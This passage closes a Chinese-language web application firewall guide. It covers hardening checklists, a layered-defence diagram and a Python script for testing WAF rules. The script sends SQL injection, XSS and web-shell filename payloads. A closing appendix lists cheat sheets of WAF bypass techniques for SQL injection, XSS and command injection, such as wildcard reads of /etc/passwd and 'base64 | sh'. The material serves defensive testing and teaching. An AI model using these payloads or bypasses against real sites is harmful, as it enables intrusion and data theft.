│   ├── 避免过度依赖正则
│   ├── 使用语义分析引擎
│   ├── 定期更新规则
│   └── 减少误报（白名单调优）
│
└── 响应策略
    ├── 拦截（Block）
    ├── 挑战（CAPTCHA/JS Challenge）
    ├── 监控（Log Only）
    └── 限流（Rate Limiting）
```

### 8.2 防护加固措施

```
WAF防护加固清单:
├── 网络层
│   ├── 限制WAF管理面访问
│   ├── 配置IP信誉库联动
│   ├── 启用DDoS防护
│   └── 设置连接数限制
│
├── 协议层
│   ├── 强制HTTPS（HSTS）
│   ├── 禁用不安全的方法
│   ├── 设置安全响应头
│   │   ├── X-Content-Type-Options: nosniff
│   │   ├── X-Frame-Options: DENY
│   │   ├── X-XSS-Protection: 1; mode=block
│   │   ├── Content-Security-Policy
│   │   └── Strict-Transport-Security
│   └── 正确处理分块传输
│
├── 应用层
│   ├── 启用OWASP CRS
│   ├── 自定义业务规则
│   ├── 限制请求频率
│   ├── 检测机器人行为
│   └── 配置Bot管理策略
│
└── 运维层
    ├── 定期更新规则库
    ├── 误报监控和调优
    ├── 日志分析和告警
    ├── 规则上线前测试
    └── 应急响应流程
```

### 8.3 多层防护体系

WAF不应是唯一的防护手段，应构建多层防御体系：

```
纵深防御体系:
┌──────────────────────────────────────────────────────┐
│                    第一层: 边缘防护                   │
│  CDN + DDoS防护 + IP信誉 + 速率限制                    │
├──────────────────────────────────────────────────────┤
│                    第二层: WAF防护                     │
│  规则匹配 + 语义分析 + 行为分析 + 机器学习              │
├──────────────────────────────────────────────────────┤
│                    第三层: 网关防护                    │
│  API网关 + 认证授权 + 限流 + 路由控制                  │
├──────────────────────────────────────────────────────┤
│                    第四层: 应用防护                    │
│  安全编码 + 输入验证 + 输出编码 + 参数化查询           │
├──────────────────────────────────────────────────────┤
│                    第五层: 运行时防护                  │
│  RASP + 进程监控 + 文件完整性 + 内存保护               │
├──────────────────────────────────────────────────────┤
│                    第六层: 日志审计                    │
│  日志收集 + SIEM + 威胁检测 + 应急响应                 │
└──────────────────────────────────────────────────────┘
```

### 8.4 WAF规则测试与调优

```python
# WAF规则测试脚本（概念示意）
import requests
import json

class WAFTester:
    def __init__(self, target, waf_log=None):
        self.target = target
        self.waf_log = waf_log
        self.test_cases = self.load_test_cases()
    
    def load_test_cases(self):
        """加载测试用例"""
        return {
            'sql_injection': [
                "1' OR '1'='1",
                "1 UNION SELECT 1,2,3--",
                "1'; DROP TABLE users--",
            ],
            'xss': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "\"><script>alert(1)</script>",
            ],
            'file_upload': [
                "shell.php",
                "shell.jpg.php",
                ".htaccess",
            ],
        }
    
    def test_all(self):
        """执行全部测试"""
        results = []
        for attack_type, payloads in self.test_cases.items():
            for payload in payloads:
                # 发送攻击Payload
                r = requests.get(self.target, params={'q': payload})
                # 判断是否被拦截
                blocked = r.status_code == 403 or 'blocked' in r.text.lower()
                results.append({
                    'type': attack_type,
                    'payload': payload,
                    'blocked': blocked,
                    'status': r.status_code,
                })
        
        # 统计
        total = len(results)
        blocked = sum(1 for r in results if r['blocked'])
        print(f'拦截率: {blocked}/{total} = {blocked/total*100:.1f}%')
        return results
    
    def check_false_positives(self, normal_inputs):
        """检测误报"""
        fp_count = 0
        for inp in normal_inputs:
            r = requests.get(self.target, params={'q': inp})
            if r.status_code == 403:
                fp_count += 1
                print(f'误报: {inp}')
        print(f'误报率: {fp_count}/{len(normal_inputs)}')
```

### 8.5 WAF运维最佳实践

| 实践 | 说明 | 频率 |
|------|------|------|
| 规则更新 | 更新OWASP CRS和厂商规则 | 每月 |
| 误报审查 | 检查被拦截的合法请求 | 每周 |
| 性能监控 | 监控WAF延迟和吞吐 | 持续 |
| 日志分析 | 分析攻击趋势和新型攻击 | 每日 |
| 规则测试 | 上线前在测试环境验证 | 每次变更 |
| 应急演练 | 模拟WAF绕过攻击 | 每季度 |
| 策略调优 | 根据业务变化调整规则 | 按需 |

---

## 附录：WAF绕过速查表

### A. SQL注入绕过速查

| 绕过方式 | 示例 | 适用 |
|----------|------|------|
| 大小写 | UnIoN SeLeCt | 通用 |
| 注释分割 | UN/**/ION | 通用 |
| 内联注释 | /*!50000UNION*/ | MySQL |
| URL编码 | %55NION | 通用 |
| 双重编码 | %2555NION | 存在解码 |
| 空格替代 | UNION%0aSELECT | 通用 |
| 等价函数 | current_user() | 通用 |
| HPP | id=1&id=UNION | 特定后端 |
| 分块传输 | chunked编码 | 特定WAF |

### B. XSS绕过速查

| 绕过方式 | 示例 | 适用 |
|----------|------|------|
| 标签变形 | `<ScRiPt>` | 通用 |
| 事件替代 | `<svg onload>` | 通用 |
| HTML实体 | `&#60;script&#62;` | 通用 |
| JS编码 | `\u0061lert` | 通用 |
| Base64 | `eval(atob(...))` | 通用 |
| Data URI | `data:text/html` | 通用 |
| JSONP | 利用白名单域 | CSP绕过 |

### C. 命令注入绕过速查

| 绕过方式 | 示例 | 适用 |
|----------|------|------|
| 通配符 | `/etc/pa??wd` | Linux Shell |
| 变量拼接 | `a=ca;b=t;$a$b` | Linux Shell |
| 编码 | `base64 \| sh` | 通用 |
| 空格替代 | `cat${IFS}` | Linux Shell |
| 引号 | `c'a't` | Linux Shell |
| 反斜杠 | `c\at` | Linux Shell |

---

> **免责声明：** 本文档所有技术内容仅用于安全研究、授权渗透测试和防御能力建设。未经授权对他人系统实施攻击行为属于违法行为。WAF绕过技术的目的是帮助安全人员评估和改进防护能力，请始终在合法授权范围内使用。
